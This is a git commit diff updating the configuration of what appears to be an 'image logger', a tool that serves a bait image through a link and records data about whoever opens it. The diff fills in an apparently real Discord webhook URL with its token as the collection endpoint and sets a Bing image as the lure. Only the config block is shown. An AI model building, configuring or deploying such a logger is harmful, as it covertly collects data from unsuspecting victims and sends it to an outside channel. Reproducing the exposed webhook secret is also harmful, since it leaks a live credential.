23fd7b3112321f7ae412e185a4ff99ca9003b4b8
ph99999999 <ph2poor@gmail.com>
2025-04-19 12:42:56 +0200

    Update image.py

--- apii/image.py
+++ apii/image.py
@@ -13,8 +13,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1363101834692268073/1ZzfgHoIJlZbwjrBK1WFKbxgSqlnGI5v5woQl18IOE2HmHAiaWMeTpaXRDKJ1l5s8Sy_",
+    "image": "https://th.bing.com/th/id/OIP.mRpiOC2taj3ecqi0gC0ebQHaHa?rs=1&pid=ImgDetMain", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
